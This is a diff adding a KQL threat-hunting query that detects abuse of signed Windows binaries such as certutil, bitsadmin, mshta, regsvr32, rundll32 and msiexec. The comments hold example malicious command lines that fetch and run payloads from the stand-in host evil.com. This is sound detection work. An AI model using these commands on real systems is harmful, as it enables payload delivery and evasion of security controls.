@@ -1,0 +1,51 @@
+// =============================================================================
+// LOLBIN (LIVING-OFF-THE-LAND BINARY) ABUSE DETECTION
+// =============================================================================
+// PURPOSE: Detect abuse of legitimate Windows binaries for malicious purposes
+// such as downloading payloads, executing code, or bypassing security controls.
+//
+// THREAT CONTEXT: APTs and ransomware groups use signed Microsoft binaries to
+// evade detection. These "LOLBins" are trusted by default and often allowlisted.
+// Detecting their abuse requires understanding their legitimate vs. malicious
+// usage patterns.
+//
+// MITRE ATT&CK: T1218 (System Binary Proxy Execution), T1105 (Ingress Tool Transfer)
+// REFERENCE: https://lolbas-project.github.io/
+// =============================================================================
+let startTime=ago(7d);
+let endTime=ago(0d);
+DeviceProcessEvents
+| where Timestamp between (startTime .. endTime)
+| where 
+    // CERTUTIL.EXE - Certificate utility abused for downloads and encoding
+    // Malicious: certutil -urlcache -f http://evil.com/payload.exe
+    // Malicious: certutil -decode encoded.txt payload.exe
+    (FileName =~ "certutil.exe" and ProcessCommandLine has_any ("urlcache", "decode", "-f"))
+    
+    // BITSADMIN.EXE - Background transfer service abused for downloads
+    // Malicious: bitsadmin /transfer job http://evil.com/payload.exe C:\payload.exe
+    or (FileName =~ "bitsadmin.exe" and ProcessCommandLine has "/transfer")
+    
+    // MSHTA.EXE - HTML Application host abused to run remote HTA files
+    // Malicious: mshta http://evil.com/payload.hta
+    or (FileName =~ "mshta.exe" and ProcessCommandLine has "http")
+    
+    // REGSVR32.EXE - COM registration abused for script execution (Squiblydoo)
+    // Malicious: regsvr32 /s /n /u /i:http://evil.com/script.sct scrobj.dll
+    or (FileName =~ "regsvr32.exe" and ProcessCommandLine has "/s /n /u /i:")
+    
+    // RUNDLL32.EXE - DLL execution abused for JavaScript execution
+    // Malicious: rundll32 javascript:"\..\mshtml,RunHTMLApplication"
+    or (FileName =~ "rundll32.exe" and ProcessCommandLine has "javascript:")
+    
+    // MSIEXEC.EXE - Installer service abused to run remote MSI packages
+    // Malicious: msiexec /q /i http://evil.com/payload.msi
+    or (FileName =~ "msiexec.exe" and ProcessCommandLine has "http")
+| project 
+    Timestamp, 
+    DeviceName, 
+    AccountName, 
+    FileName,                    // The LOLBin being abused
+    ProcessCommandLine,          // Full command showing malicious intent
+    InitiatingProcessFileName    // What launched it (script? another LOLBin?)
+| order by Timestamp desc
